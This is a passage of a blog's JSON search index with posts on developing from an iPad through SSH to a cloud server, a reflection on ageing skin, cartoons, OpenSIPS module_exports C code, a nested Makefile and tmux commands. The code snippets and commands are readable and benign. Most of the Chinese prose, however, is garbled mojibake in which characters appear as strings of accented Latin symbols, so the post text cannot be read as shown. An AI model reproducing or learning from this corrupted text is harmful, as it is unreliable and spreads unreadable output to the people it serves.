ä¸ªè½¯ä»¶ï¼š\nVIM tumx åè®° ","permalink":"https://wdd.js.org/posts/2020/09/rzumhc/","summary":"ä¸ºä»€ä¹ˆè¦ç”¨iPadå¼€å‘ï¼Ÿ ç¬¬ä¸€ï¼Œæˆ‘ä¸æƒ³å†ä¹°å°ç”µè„‘æˆ–è€…ç¬”è®°æœ¬æ”¾åœ¨å®¶é‡Œã€‚å› ä¸ºæˆ‘ä¹Ÿä¸ç”¨ç”µè„‘æ¥æ‰“æ¸¸æˆã€‚è€Œä¸”æ— è®ºå°å¼æœºè¿˜æ˜¯ç¬”è®°æœ¬éƒ½æ¯”è¾ƒå åœ°æ–¹ã€‚æ¬å®¶ä¹Ÿè´¹åŠ²ã€‚ ç¬¬äºŒï¼Œæˆ‘åªæœ‰ä¸€å°MacBook Proï¼Œä»¥å‰ä¸‹ç­ä¹Ÿä¼šèƒŒç€ï¼Œå› ä¸ºæ€»æœ‰äº›äº‹æƒ…éœ€è¦åšã€‚ä½†æ˜¯è‡ªä»æœ‰ä¸€å¤©è§‰å¾—è‚©è†€ä¸èˆ’æœäº†ï¼Œæˆ‘å°±å†³å®šä¸å†èƒŒç”µè„‘ã€‚å»‰é¢‡è€çŸ£ï¼Œè…°é…¸èƒŒç—›ã€‚ è™½ç„¶ä¸å†èƒŒç”µè„‘ï¼Œä½†æ˜¯å¶æœ‰é›…å…´ï¼Œå¿ƒè¡€æ¥æ½®ï¼Œæˆ‘è¿˜éœ€è¦å†™ç‚¹åšå®¢æˆ–è€…ä»£ç çš„ã€‚ æ‰€ä»¥æˆ‘ä¹°äº†å°iPadæ¥å¼€å‘æˆ–è€…å†™åšå®¢ã€‚ å‰æœŸå‡†å¤‡å·¥ä½œ ç¡¬ä»¶å‡†å¤‡ ä¸€å°iPad ä¸€ä¸ªè“ç‰™é”®ç›˜ã€‚æœ€å¥½ä¹°é‚£ç§é€‚åˆç¬”è®°æœ¬çš„è“ç‰™é”®ç›˜ï¼Œåƒä¸‡ä¸è¦ä¹°å¯æŠ˜å çš„è“ç‰™é”®ç›˜ï¼Œå› ä¸ºç”¨ç€ä¸èˆ’æœ è½¯ä»¶å‡†å¤‡ å¸¸è§„çš„åŠŸèƒ½ï¼Œä¾‹å¦‚å†™æ–‡å­—ï¼Œå†™åšå®¢ï¼Œä¸€ä¸ªæµè§ˆå™¨è¶³ä»¥èƒœä»»ã€‚å”¯ä¸€çš„éš¾ç‚¹åœ¨äºå¦‚ä½•ç¼–ç¨‹ã€‚\nç›®å‰æ¥è¯´ï¼Œæœ‰ä¸¤ä¸ªæ–¹æ¡ˆï¼š\næ–¹æ¡ˆ1: ä½¿ç”¨åœ¨çº¿ç¼–è¾‘å™¨ã€‚ä¾‹å¦‚ç äº‘ï¼Œgithub, codepenç­‰ç½‘ç«™ï¼Œéƒ½æ˜¯æä¾›åœ¨çº¿ç¼–è¾‘å™¨çš„ã€‚ä¼˜ç‚¹æ˜¯æ–¹ä¾¿ï¼Œå…è´¹ã€‚ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œæ— æ³•è°ƒè¯•æˆ–è€…è¿è¡Œä»£ç ã€‚ æ–¹æ¡ˆ2: è´­ä¹°äº‘ä¸»æœºï¼ŒiPadä¸Šå®‰è£…Termius, sshè¿œç¨‹è¿æ¥åˆ°æœåŠ¡ç«¯ï¼Œåœ¨çœŸæ­£çš„æ“ä½œç³»ç»Ÿä¸­åšå¼€å‘ã€‚ä¼˜ç‚¹æ˜¯æ¯”è¾ƒè‡ªç”±ï¼Œæ‰©å±•æ€§å¼ºã€‚ç¼ºç‚¹æ˜¯éœ€è¦èŠ±é’±ï¼Œè€Œä¸”åœ¨æ²¡æœ‰IDEç¯å¢ƒåšå¼€å‘æ˜¯æœ‰ä¸å°çš„éš¾åº¦çš„ã€‚ æ–¹æ¡ˆ1ç”±äºæ¯”è¾ƒç®€å•ï¼Œå°±ä¸èµ˜è¿°äº†ã€‚\nç€é‡è®²è®²æ–¹æ¡ˆ2:\nè´­ä¹°äº‘ä¸»æœº ä¸€èˆ¬æ¥è¯´ï¼Œå³ä½¿æ˜¯æœ€ä½é…ç½®çš„ä¸»æœºï¼Œä¸€å¹´çš„è´¹ç”¨ä¹Ÿè‡³å°‘è¦å‡ ç™¾å—ã€‚ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–æƒ…å†µã€‚æˆ‘çš„ç›®æ ‡æ˜¯æ‰¾é‚£äº›å¹´è´¹åœ¨ä¸€ç™¾å—ä»¥å†…çš„äº‘ä¸»æœºã€‚\né’ˆå¯¹å¤§å­¦ç”Ÿçš„ä¼˜æƒ ã€‚ä¸€èˆ¬å¤§å­¦ç”Ÿå¯ä»¥ä»¥å‡ åå—çš„ä»·é’±ä¹°åˆ°æœ€ä½é…çš„äº‘ä¸»æœºã€‚ é’ˆå¯¹æ–°ç”¨æˆ·çš„ä¼˜æƒ ã€‚æ–°ç”¨æˆ·çš„ä¼˜æƒ åŠ›åº¦è¿˜æ˜¯å¾ˆå¤§çš„ã€‚ä¸€èˆ¬ç”¨è¿‡ä¸€å¹´ä¹‹åï¼Œæˆ‘å°±ä¼šè½¬ç«™å…¶ä»–äº‘æœåŠ¡æä¾›å•†ã€‚æ‰€ä»¥å›½å†…çš„å¥½å¤šæœµå…¬æœ‰äº‘ï¼ŒåŸºæœ¬ä¸Šæˆ‘éƒ½ä¸Šè¿‡ã€‚å”¯ä¸€æ²¡ä¸Šè¿‡çš„å°±æ˜¯ç­‹æ–—äº‘ã€‚ ç‰¹æ®Šä¼˜æƒ æ—¥ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸€å¹´ä¹‹å†…ï¼Œè‡³å°‘å­˜åœ¨ä¸¤ä¸ªä¼˜æƒ æ—¥ï¼ŒåŒåä¸€å’Œå…­ä¸€å…«ã€‚åœ¨è¿™ä¸¤ä¸ªæ—¶é—´ç‚¹ï¼Œä¸€èˆ¬å¯ä»¥ä¹°åˆ°æ¯”è¾ƒä¼˜æƒ çš„äº‘ä¸»æœºã€‚ å¼€å‘ç¯å¢ƒæ­å»º ä½¿ç”¨Terminueè¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šã€‚æ³¨æ„æœ€å¥½åœ¨å…¬æœ‰äº‘ä¸Šä½¿ç”¨å…¬é’¥ç™»å½•ï¼Œå¹¶ç¦æ­¢æ‰å¯†ç ç™»å½•ã€‚æœ€å¥½å†å®‰è£…ä¸ªfail2banã€‚å› ä¸ºæ¯ä¸ªäº‘ä¸»æœºåŸºæœ¬ä¸Šæ¯å¤©éƒ½æœ‰å¾ˆå¤šæ¶æ„çš„ç™»å½•å°è¯•ã€‚ éœ€è¦å®‰è£…oh-my-zsh. æœ€å¥½ç”¨çš„sh, ä¸è§£é‡Šã€‚ ä½œä¸ºå¼€å‘ç¯å¢ƒï¼Œä¸€ä¸ªå±å¹•è‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥ä½ éœ€è¦tmux. ç¼–è¾‘å™¨å‘¢ã€‚é”»ç‚¼è‡ªå·±çš„VIMä½¿ç”¨èƒ½åŠ›å§ã€‚VIMæ˜¯ä¸ªå¤–è¾¹æ¯”è¾ƒå†°å†·çš„ç¼–è¾‘å™¨ï¼Œä¸Šæ‰‹éš¾åº¦ç›¸æ¯”äºé‚£äº›èŠ±èŠ±ç»¿ç»¿çš„ç¼–è¾‘å™¨è€Œè¨€ï¼Œæ˜¾å¾—é‚£ä¹ˆæ ¼æ ¼ä¸å…¥ã€‚ä½†æ˜¯å°±åƒæœ‰é¦–æ­Œå”±çš„çš„ï¼Œæœ‰äº›äººä¸çŸ¥é“é‚£äº›å¥½ï¼Œä½†å°±æ˜¯è°ä¹Ÿæ›¿ä»£ä¸äº†ã€‚ æ€»ä¹‹å‘¢ï¼Œä½ å¿…é¡»è¦å¼ºè¿«è‡ªå·±èƒ½å¤Ÿç†Ÿç»ƒçš„è¿ç”¨ä»¥ä¸‹çš„å‡ ä¸ªè½¯ä»¶ï¼š\nVIM tumx åè®° ","title":"ä½¿ç”¨iPadå¼€å‘æŠ˜è…¾è®°"},{"content":"æ—©ä¸Šå…­ç‚¹å¤šèµ·åºŠï¼Œæ­ä¹˜åŠä¸ªå°æ—¶çš„åœ°é“ï¼Œæ¥åˆ°åŒ»é™¢åšä½“éªŒã€‚\nåœ¨æŠ½è¡€æ’é˜Ÿå«å·çš„æ—¶å€™ï¼Œæˆ‘çœ‹åˆ°ä¸€ä½è€å¥¶å¥¶è¢«å¥¹å¥³å„¿æ€æ‰¶ç€ååœ¨æŠ½è¡€çš„çª—å£å‰ã€‚\nè€å¥¶å¥¶æŠŠå³è¾¹çš„èƒ³è†Šä¼¸åˆ°æŠ½è¡€çš„å«å­ä¸Šï¼Œé‚£æ˜¯è®©äººçœ‹ä¸€çœ¼å°±éš¾ä»¥å¿˜è®°çš„çš®è‚¤ã€‚å¥¹çš„çš®è‚¤éå¸¸æ¾å¼›ï¼Œå¸ƒæ»¡äº†è¤¶çš±ï¼Œè¤¶çš±ä¸Šæœ‰å„ç§æ£•è‰²å’Œæ·±è‰²çš„æ–‘ç‚¹ã€‚\næˆ‘å›æƒ³èµ·äº†é«˜ä¸­æ—¶å­¦çš„ç”Ÿç‰©å­¦ï¼Œçš®è‚¤æ˜¯äººç±»æœ€å¤§çš„ä¸€ä¸ªå™¨å®˜ï¼Œå¹¶ä¸”æ˜¯ä¿æŠ¤äººä½“çš„ç¬¬ä¸€é“é˜²çº¿ã€‚\næˆ‘ä¸ç¦çœ‹äº†çœ‹è‡ªå·±èƒ³è†Šï¼Œæ€ç»ªä¸‡åƒã€‚æˆ–è®¸ä»¥åæˆ‘çš„çš®è‚¤ä¹Ÿæ˜¯è¿™æ ·å§ã€‚è¿™å°±æ˜¯å²æœˆçš„çš®è‚¤ï¼\næ—¶é—´å•Šï¼ä½ èµ°çš„æ…¢ç‚¹å§ï¼\näººç”Ÿå¾ˆçŸ­ï¼Œåšäº›å€¼å¾—å›å¿†çš„äº‹æƒ…å§ã€‚\n","permalink":"https://wdd.js.org/posts/2020/08/cs9htr/","summary":"æ—©ä¸Šå…­ç‚¹å¤šèµ·åºŠï¼Œæ­ä¹˜åŠä¸ªå°æ—¶çš„åœ°é“ï¼Œæ¥åˆ°åŒ»é™¢åšä½“éªŒã€‚\nåœ¨æŠ½è¡€æ’é˜Ÿå«å·çš„æ—¶å€™ï¼Œæˆ‘çœ‹åˆ°ä¸€ä½è€å¥¶å¥¶è¢«å¥¹å¥³å„¿æ€æ‰¶ç€ååœ¨æŠ½è¡€çš„çª—å£å‰ã€‚\nè€å¥¶å¥¶æŠŠå³è¾¹çš„èƒ³è†Šä¼¸åˆ°æŠ½è¡€çš„å«å­ä¸Šï¼Œé‚£æ˜¯è®©äººçœ‹ä¸€çœ¼å°±éš¾ä»¥å¿˜è®°çš„çš®è‚¤ã€‚å¥¹çš„çš®è‚¤éå¸¸æ¾å¼›ï¼Œå¸ƒæ»¡äº†è¤¶çš±ï¼Œè¤¶çš±ä¸Šæœ‰å„ç§æ£•è‰²å’Œæ·±è‰²çš„æ–‘ç‚¹ã€‚\næˆ‘å›æƒ³èµ·äº†é«˜ä¸­æ—¶å­¦çš„ç”Ÿç‰©å­¦ï¼Œçš®è‚¤æ˜¯äººç±»æœ€å¤§çš„ä¸€ä¸ªå™¨å®˜ï¼Œå¹¶ä¸”æ˜¯ä¿æŠ¤äººä½“çš„ç¬¬ä¸€é“é˜²çº¿ã€‚\næˆ‘ä¸ç¦çœ‹äº†çœ‹è‡ªå·±èƒ³è†Šï¼Œæ€ç»ªä¸‡åƒã€‚æˆ–è®¸ä»¥åæˆ‘çš„çš®è‚¤ä¹Ÿæ˜¯è¿™æ ·å§ã€‚è¿™å°±æ˜¯å²æœˆçš„çš®è‚¤ï¼\næ—¶é—´å•Šï¼ä½ èµ°çš„æ…¢ç‚¹å§ï¼\näººç”Ÿå¾ˆçŸ­ï¼Œåšäº›å€¼å¾—å›å¿†çš„äº‹æƒ…å§ã€‚","title":"å²æœˆçš„çš®è‚¤"},{"content":"æˆ‘æŒºå–œæ¬¢çœ‹åŠ¨æ¼«çš„ï¼Œå°¤å…¶æ˜¯æ—¥æ¼«(ä¼¼ä¹ä¹Ÿæ²¡æœ‰åˆ«çš„é€‰æ‹©ğŸ¶)ã€‚\nå°æ—¶å€™æ˜Ÿç©ºå«è§†æ”¾ä¸ƒé¾™ç ï¼Œå¤§å­¦è¿½ç«å½±å’Œæµ·è´¼ç‹ã€‚æ—¥æ¼«ä¸­æ¢¦æƒ³å’Œæ¿€æˆ˜æ€»æ˜¯å°‘ä¸äº†ï¼Œè¿™ä¹Ÿæ˜¯å°‘å¹´æ‰€å¿…ä¸å¯å°‘çš„ã€‚ä½†æ˜¯æ—¥æ¼«æœ‰ä¸ªå¾ˆå¤§çš„ç‰¹ç‚¹ï¼Œå°±æ˜¯çƒ‚å°¾ã€‚\næ²¡åŠæ³•ï¼Œæ¼«ç”»ä¸€æ—¦è¾¾åˆ°äº†ä¸€å®šçš„è¿è½½æ—¶æœŸï¼Œå¾ˆå¤šæ—¶å€™å¾€å¾€ä¸å—åŸä½œè€…æ§åˆ¶äº†ã€‚è¿™å…¶ä¸­å¯èƒ½æ¶‰åŠåˆ°ä¸å°‘äººçš„åˆ©ç›Šçº è‘›ã€‚\nä¸åŠ¨è¾„å‡ ç™¾é›†çš„æ—¥æ¼«ç›¸æ¯”ï¼Œç¾æ¼«ä¼¼ä¹æ›´åŠ åå‘äºçŸ­å°ç²¾æ‚ã€‚\nè¿‘å¹´æ¥æˆ‘ä¹Ÿçœ‹è¿‡ä¸€äº›ä¸é”™çš„ç¾æ¼«ã€‚ä¾‹å¦‚ç‘å…‹å’Œè«æï¼Œè„†è“å…¬å›­ã€‚è¿™ç±»æ¼«ç”»æœ‰ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯æ›´åŠ ç°å®ï¼Œå½“ç„¶å…¶ä¸­ä¹Ÿä¸ä¹æœ‰æ¸©æƒ…å‡ºç°ã€‚çœ‹è¿™ç±»æ¼«ç”»ï¼Œè®©æˆ‘æƒ³åˆ°æå®—å¾å…ˆç”Ÿæ‰€è¯´çš„åšé»‘å­¦ã€‚æ„Ÿè§‰ç¾å›½äººæ˜¯æ— å¸ˆè‡ªé€šï¼Œæ·±è°™åšé»‘ä¹‹å“²å­¦ã€‚\nä¹Ÿè®¸åŠ¨æ¼«æ²¡æœ‰å˜ï¼Œå˜çš„æ˜¯æˆ‘ä»¬è‡ªå·±ï¼šä»æ¢¦æƒ³å’Œæ¿€æˆ˜è½¬å˜åˆ°ç°å®å’Œåšé»‘ã€‚\n","permalink":"https://wdd.js.org/posts/2020/08/ybgr0g/","summary":"æˆ‘æŒºå–œæ¬¢çœ‹åŠ¨æ¼«çš„ï¼Œå°¤å…¶æ˜¯æ—¥æ¼«(ä¼¼ä¹ä¹Ÿæ²¡æœ‰åˆ«çš„é€‰æ‹©ğŸ¶)ã€‚\nå°æ—¶å€™æ˜Ÿç©ºå«è§†æ”¾ä¸ƒé¾™ç ï¼Œå¤§å­¦è¿½ç«å½±å’Œæµ·è´¼ç‹ã€‚æ—¥æ¼«ä¸­æ¢¦æƒ³å’Œæ¿€æˆ˜æ€»æ˜¯å°‘ä¸äº†ï¼Œè¿™ä¹Ÿæ˜¯å°‘å¹´æ‰€å¿…ä¸å¯å°‘çš„ã€‚ä½†æ˜¯æ—¥æ¼«æœ‰ä¸ªå¾ˆå¤§çš„ç‰¹ç‚¹ï¼Œå°±æ˜¯çƒ‚å°¾ã€‚\næ²¡åŠæ³•ï¼Œæ¼«ç”»ä¸€æ—¦è¾¾åˆ°äº†ä¸€å®šçš„è¿è½½æ—¶æœŸï¼Œå¾ˆå¤šæ—¶å€™å¾€å¾€ä¸å—åŸä½œè€…æ§åˆ¶äº†ã€‚è¿™å…¶ä¸­å¯èƒ½æ¶‰åŠåˆ°ä¸å°‘äººçš„åˆ©ç›Šçº è‘›ã€‚\nä¸åŠ¨è¾„å‡ ç™¾é›†çš„æ—¥æ¼«ç›¸æ¯”ï¼Œç¾æ¼«ä¼¼ä¹æ›´åŠ åå‘äºçŸ­å°ç²¾æ‚ã€‚\nè¿‘å¹´æ¥æˆ‘ä¹Ÿçœ‹è¿‡ä¸€äº›ä¸é”™çš„ç¾æ¼«ã€‚ä¾‹å¦‚ç‘å…‹å’Œè«æï¼Œè„†è“å…¬å›­ã€‚è¿™ç±»æ¼«ç”»æœ‰ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯æ›´åŠ ç°å®ï¼Œå½“ç„¶å…¶ä¸­ä¹Ÿä¸ä¹æœ‰æ¸©æƒ…å‡ºç°ã€‚çœ‹è¿™ç±»æ¼«ç”»ï¼Œè®©æˆ‘æƒ³åˆ°æå®—å¾å…ˆç”Ÿæ‰€è¯´çš„åšé»‘å­¦ã€‚æ„Ÿè§‰ç¾å›½äººæ˜¯æ— å¸ˆè‡ªé€šï¼Œæ·±è°™åšé»‘ä¹‹å“²å­¦ã€‚\nä¹Ÿè®¸åŠ¨æ¼«æ²¡æœ‰å˜ï¼Œå˜çš„æ˜¯æˆ‘ä»¬è‡ªå·±ï¼šä»æ¢¦æƒ³å’Œæ¿€æˆ˜è½¬å˜åˆ°ç°å®å’Œåšé»‘ã€‚","title":"ä»æ—¥æ¼«åˆ°ç¾æ¼«"},{"content":"module_exports è¿™ä¸ªç»“æ„åœ¨æ¯ä¸ªæ¨¡å—ä¸­éƒ½æœ‰ï¼Œè¿™ä¸ªæœ‰ç‚¹ç±»ä¼¼jsçš„exportæˆ–è€…è¯´æ˜¯node.jsçš„module.exportã€‚\nè¿™æ˜¯ä¸€ä¸ªæ¥å£çš„è§„èŒƒã€‚\né‡è¦è®²è§£å‡ ä¸ªå…³é”®ç‚¹ï¼š\nlocal_zone_codeæ˜¯æ¨¡å—åå­—ï¼Œè¿™ä¸ªæ˜¯å¿…éœ€çš„ cmdsè¡¨ç¤ºåœ¨opensipsè„šæœ¬é‡Œå¯ä»¥æœ‰é‚£äº›æš´éœ²çš„å‡½æ•° paramsè§„å®šäº†æ¨¡å—çš„å‚æ•° mod_initåœ¨æ¨¡å—åˆå§‹åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨, åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ å…³äºmodule_exportsè¿™ä¸ªç»“æ„çš„å®šä¹‰ï¼Œå¯ä»¥æŸ¥é˜…ï¼šsr_module.hæ–‡ä»¶\nstruct module_exports exports= { \u0026#34;local_zone_code\u0026#34;, MOD_TYPE_DEFAULT,/* class of this module */ MODULE_VERSION, DEFAULT_DLFLAGS, /* dlopen flags */ 0, /* load function */ NULL, /* OpenSIPS module dependencies */ cmds, 0, params, 0, /* exported statistics */ 0, /* exported MI functions */ 0, /* exported pseudo-variables */ 0, /* exported transformations */ 0, /* extra processes */ 0, /* pre-init function */ mod_init, (response_function) 0, (destroy_function) 0, 0 /* per-child init function */ }; cmds struct cmd_export_ { char* name; /* opensipsè„šæœ¬é‡Œçš„å‡½æ•°å */ cmd_function function; /* å…³è”çš„Cä»£ç é‡Œçš„å‡½æ•° */ int param_no; /* å‚æ•°çš„ä¸ªæ•° */ fixup_function fixup; /* ä¿®æ­£å‚æ•° */ free_fixup_function free_fixup; /* ä¿®æ­£å‚æ•°çš„ */ int flags; /* å‡½æ•°flagï¼Œä¸»è¦æ˜¯ç”¨æ¥æ ‡è®°å‡½æ•°å¯ä»¥åœ¨å“ªäº›è·¯ç”±ä¸­ä½¿ç”¨ */ }; cmd_function\ntypedef int (*cmd_function)(struct sip_msg*, char*, char*, char*, char*, char*, char*); cmd_functionä¸fixup_functionçš„å…³ç³» cmd_functionæ˜¯åœ¨opensipsè¿è¡Œåï¼Œåœ¨è·¯ç”±è„šæœ¬ä¸­ä¼šæ‰§è¡Œåˆ° fixup_functionå®é™…ä¸Šæ˜¯åœ¨opensipsè¿è¡Œå‰ï¼Œè„šæœ¬è§£æå®Œæˆåä¼šæ‰§è¡Œ fixup_functionçš„ç›®çš„æ˜¯åœ¨è„šæœ¬è§£æé˜¶æ®µå‘ç°å‚æ•°çš„é—®é¢˜ï¼Œæˆ–è€…ä¿®æ”¹æŸäº›å‚æ•°çš„å€¼ çœŸå®çš„æ —å­ï¼š\nstatic cmd_export_t cmds[]={ {\u0026#34;lzc_change\u0026#34;, (cmd_function)change_code, 2, change_code_fix, 0, REQUEST_ROUTE}, {0,0,0,0,0,0} }; static int change_code_fix(void** param, int param_no) { LM_INFO(\u0026#34;enter change_code_fix: param: %s\\n\u0026#34;, (char *)*param); LM_INFO(\u0026#34;enter change_code_fix: param_no: %d\\n\u0026#34;, param_no); LM_INFO(\u0026#34;enter change_code_fix: local_zone_code: %s len:%d\\n\u0026#34;, local_zone_code.s,local_zone_code.len); return 0; } ä¸Šé¢çš„å®šä¹‰ï¼Œå¯ä»¥åœ¨opensipsè„šæœ¬ä¸­ä½¿ç”¨lzc_changeè¿™ä¸ªå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°å¯¹åº”cä»£ç é‡Œçš„change_codeå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°å…è®¸æ¥å—2ä¸¤ä¸ªå‚æ•°ã€‚\nopensipsè„šæœ¬\nroute{ lzc_change(\u0026#34;abcd\u0026#34;,\u0026#34;desf\u0026#34;); } debugæ—¥å¿—ï¼šä»æ—¥å¿—å¯ä»¥çœ‹å‡ºæ¥lzc_changeæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œchange_code_fixè¢«è°ƒç”¨äº†ä¸¤æ¬¡ï¼Œæ¯æ¬¡è°ƒç”¨å¯ä»¥è·å–å‚æ•°çš„å€¼ï¼Œå’Œå‚æ•°çš„åºå·ã€‚\nDBG:core:fix_actions: fixing lzc_change, opensips.mf2.cfg:18 INFO:local_zone_code:change_code_fix: enter change_code_fix: param: abcd INFO:local_zone_code:change_code_fix: enter change_code_fix: param_no: 1 INFO:local_zone_code:change_code_fix: enter change_code_fix: local_zone_code: 0728 len:4 INFO:local_zone_code:change_code_fix: enter change_code_fix: param: desf INFO:local_zone_code:change_code_fix: enter change_code_fix: param_no: 2 INFO:local_zone_code:change_code_fix: enter change_code_fix: local_zone_code: 0728 len:4 ","permalink":"https://wdd.js.org/opensips/module-dev/l5/","summary":"module_exports è¿™ä¸ªç»“æ„åœ¨æ¯ä¸ªæ¨¡å—ä¸­éƒ½æœ‰ï¼Œè¿™ä¸ªæœ‰ç‚¹ç±»ä¼¼jsçš„exportæˆ–è€…è¯´æ˜¯node.jsçš„module.exportã€‚\nè¿™æ˜¯ä¸€ä¸ªæ¥å£çš„è§„èŒƒã€‚\né‡è¦è®²è§£å‡ ä¸ªå…³é”®ç‚¹ï¼š\nlocal_zone_codeæ˜¯æ¨¡å—åå­—ï¼Œè¿™ä¸ªæ˜¯å¿…éœ€çš„ cmdsè¡¨ç¤ºåœ¨opensipsè„šæœ¬é‡Œå¯ä»¥æœ‰é‚£äº›æš´éœ²çš„å‡½æ•° paramsè§„å®šäº†æ¨¡å—çš„å‚æ•° mod_initåœ¨æ¨¡å—åˆå§‹åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨, åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ å…³äºmodule_exportsè¿™ä¸ªç»“æ„çš„å®šä¹‰ï¼Œå¯ä»¥æŸ¥é˜…ï¼šsr_module.hæ–‡ä»¶\nstruct module_exports exports= { \u0026#34;local_zone_code\u0026#34;, MOD_TYPE_DEFAULT,/* class of this module */ MODULE_VERSION, DEFAULT_DLFLAGS, /* dlopen flags */ 0, /* load function */ NULL, /* OpenSIPS module dependencies */ cmds, 0, params, 0, /* exported statistics */ 0, /* exported MI functions */ 0, /* exported pseudo-variables */ 0, /* exported transformations */ 0, /* extra processes */ 0, /* pre-init function */ mod_init, (response_function) 0, (destroy_function) 0, 0 /* per-child init function */ }; cmds struct cmd_export_ { char* name; /* opensipsè„šæœ¬é‡Œçš„å‡½æ•°å */ cmd_function function; /* å…³è”çš„Cä»£ç é‡Œçš„å‡½æ•° */ int param_no; /* å‚æ•°çš„ä¸ªæ•° */ fixup_function fixup; /* ä¿®æ­£å‚æ•° */ free_fixup_function free_fixup; /* ä¿®æ­£å‚æ•°çš„ */ int flags; /* å‡½æ•°flagï¼Œä¸»è¦æ˜¯ç”¨æ¥æ ‡è®°å‡½æ•°å¯ä»¥åœ¨å“ªäº›è·¯ç”±ä¸­ä½¿ç”¨ */ }; cmd_function","title":"æ¦‚å¿µç†è§£ module_exports"},{"content":"Makefile ---src |___Makefile |___main.c å¦‚ä½•ç¼–å†™é¡¶å±‚çš„Makefiel, ä½¿å…¶è¿›å…¥åˆ°srcä¸­ï¼Œæ‰§è¡Œsrcä¸­çš„Makefile?\nrun: $(MAKE) -C src target a=1 b=2 ","permalink":"https://wdd.js.org/posts/2020/08/rudtng/","summary":"Makefile ---src |___Makefile |___main.c å¦‚ä½•ç¼–å†™é¡¶å±‚çš„Makefiel, ä½¿å…¶è¿›å…¥åˆ°srcä¸­ï¼Œæ‰§è¡Œsrcä¸­çš„Makefile?\nrun: $(MAKE) -C src target a=1 b=2 ","title":"ç»Ÿä¸€å…¥å£Makefile"},{"content":"tmuxä½¿ç”¨åœºæ™¯ è¿œç¨‹sshè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œæœ€éš¾å—çš„æ˜¯éšæ—¶æœ‰å¯èƒ½sshæ‰çº¿ï¼Œç„¶åä¸€åˆ‡éƒ½éœ€è¦èŠ±é¢å¤–çš„æ—¶é—´é‡æ–°æ¢å¤ï¼Œä¹Ÿæœ‰å¯èƒ½ä¸€äº›å·¥ä½œåªèƒ½é‡æ–°å¼€å§‹ã€‚\nåœ¨æ¥ç»­ä»‹ç»tmuxä¹‹å‰ï¼Œå…ˆè¯´è¯´moshã€‚\nã€moshæ¶æ„å›¾ã€‘\næˆ‘æ›¾ä½¿ç”¨è¿‡mosh, æ®è¯´moshæ°¸è¿œä¸ä¼šæ‰çº¿ã€‚å®é™…ä¸Šæœ‰å¯èƒ½çš„ç¡®å¦‚æ­¤ï¼Œä½†æ˜¯moshå®é™…ä¸Šå®‰è£…æ¯”è¾ƒéº»çƒ¦ã€‚moshéœ€è¦åœ¨æœåŠ¡ç«¯å®‰è£…server, ç„¶åè¦åœ¨ä½ æœ¬åœ°çš„ç”µè„‘ä¸Šå®‰è£…client, ç„¶åé€šè¿‡è¿™ä¸ªclientå»è¿æ¥moshæœåŠ¡ç«¯çš„å®ˆæŠ¤è¿›ç¨‹ã€‚moshéœ€è¦å®‰è£…åœ¨å®¢æˆ·ç«¯æœåŠ¡ç«¯éƒ½å®‰è£…è½¯ä»¶ï¼Œç„¶åå¯èƒ½è¿˜è¦è®¾ç½®ä¸€ä¸‹ç½‘ç»œç­–ç•¥ï¼Œæ‰èƒ½çœŸæ­£ä½¿ç”¨ã€‚\nmoshéœ€è¦æ”¹å˜å¾ˆå¤šï¼Œè¿™åœ¨ç”Ÿäº§ç¯å¢ƒæ˜¯ä¸å¯èƒ½çš„ã€‚å¦å¤–å³ä½¿æ˜¯è‡ªå·±çš„å¼€å‘ç¯å¢ƒï¼Œè¿™æ ·æèµ·æ¥ä¹Ÿæ˜¯æ¯”è¾ƒéº»çƒ¦çš„ã€‚\nä¸‹å›¾æ˜¯tmuxçš„æ¶æ„å›¾ã€‚å®é™…ä¸Šæˆ‘ä»¬åªéœ€è¦åœ¨æœåŠ¡ç«¯å®‰è£…tmux, å‰©ä¸‹çš„sshçš„è¿æ¥éƒ½å¯ä»¥ç”¨æ ‡å‡†çš„åŠŸèƒ½ã€‚ ã€tmuxæ¶æ„å›¾ã€‘\ntmuxæ¦‚å¿µï¼šsesssion, window, panes æ¦‚å¿µä¸æ¸…æ¥šï¼Œå¾€å¾€æ˜¯è§‰å¾—tmuxéš¾ç”¨çš„å…³é”®ç‚¹ã€‚\nsessionä¹‹é—´æ˜¯ç›¸äº’éš”ç¦»çš„ï¼Œtmuxå¯ä»¥å¯åŠ¨å¤šä¸ªsession ä¸€ä¸ªsessionå¯ä»¥æœ‰å¤šä¸ªwindow ä¸€ä¸ªwindowå¯ä»¥æœ‰å¤šä¸ªpanes åœ¨tmuxä¸­æŒ‰ctrl-b w, å¯ä»¥åœ¨sesionï¼Œwindowå’Œpanelä¹‹é—´è·³è½¬ã€‚\næ³¨æ„ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªsesioné»˜è®¤ä¼šæ‰“å¼€ä¸€ä¸ªwindow, ä¸€ä¸ªwindowä¼šé»˜è®¤æ‰“å¼€ä¸€ä¸ªpaneã€‚\nsessionæ“ä½œ åˆ›å»ºæ–°çš„sesssion: tmux new -s some_nameÂ è„±ç¦»session: ctrl-b +dÂ æ³¨æ„å³ä½¿è„±ç¦»sessionï¼Œ sessionä¸­çš„å†…å®¹è¿˜æ˜¯åœ¨ç»§ç»­å·¥ä½œçš„ è¿›å…¥æŸä¸ªsession: tmux attach -t some_nameÂ æŸ¥çœ‹sesionåˆ—è¡¨: tmux lsÂ killæŸä¸ªsession: tmux kill-session -t some_nameÂ killæ‰€æœ‰session: tmux kill-serverÂ é‡å‘½åsession: ctrl-b $Â é€‰æ‹©session: ctrl-b sÂ windowæ“ä½œ æ–°å»º: ctrl-b cÂ æŸ¥çœ‹åˆ—è¡¨: ctrl-b wÂ å…³é—­å½“å‰window: ctrl-b \u0026amp;Â é‡å‘½åå½“å‰window: ctrl-b ,Â åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªwindow: ctrl-b pÂ 